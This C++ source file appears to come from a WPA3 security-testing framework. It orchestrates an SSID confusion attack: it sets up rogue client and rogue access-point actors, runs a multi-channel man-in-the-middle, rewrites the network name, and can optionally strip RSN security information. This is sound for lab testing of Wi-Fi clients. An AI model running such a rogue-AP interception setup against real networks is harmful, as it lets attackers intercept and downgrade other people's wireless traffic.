#include "attacks/mc_mitm/ssid_confusion_attack.h"

#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/mc_mitm_attack.h"
#include "attacks/mc_mitm/ssid_confusion_hooks.h"
#include "config/RunStatus.h"
#include "observer/state_log_graph.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion {

void setup_attack(RunStatus &rs) {
	const auto conf = rs.config_path().parent_path() / "config" / "SafeNet_WrongNet.conf";
	if(exists(conf)) { copy_f(conf, rs.run_folder() / "SafeNet_WrongNet.conf"); }
	components::client_ap_setup_t(rs);
	components::setup_AP(rs, "wrong_ap");
}

void run_attack(RunStatus &rs) {
	const auto rogue_client = rs.get_actor("rogue_client");
	const auto rogue_ap = rs.get_actor("rogue_ap");
	const auto ap = rs.get_actor("ap");
	const auto client = rs.get_actor("client");

	const auto &att_cfg = rs.config().at("attack_config");
	const string confused_ssid = att_cfg.value("confused_ssid", ap.get(SK::mac));
	const bool strip_rsn = att_cfg.value("strip_rsn", false);
	const int timeout = att_cfg.value("attack_time_sec", 30);

	McMitm attack(rogue_client, rogue_ap, client, ap, rs.run_folder());

	attack.set_hooks(make_unique<SsidConfusionHooks>(ap.get(SK::ssid), confused_ssid, strip_rsn));

	rogue_client->up_sniff_iface();
	rogue_ap->set_iface_up();
	rogue_client->set_iface_up();

	attack.netconfig.real_channel = rogue_client->get_channel();
	attack.netconfig.rogue_channel = rogue_ap->get_channel();
	attack.netconfig.ssid = ap[SK::mac] ? ap.get(SK::mac) : "";

	// rs.start_observer in attack.ru
	attack.run(rs, timeout);
}

//TODO
void stats_attack(const RunStatus &rs) { mc_mitm::stats(rs); }

}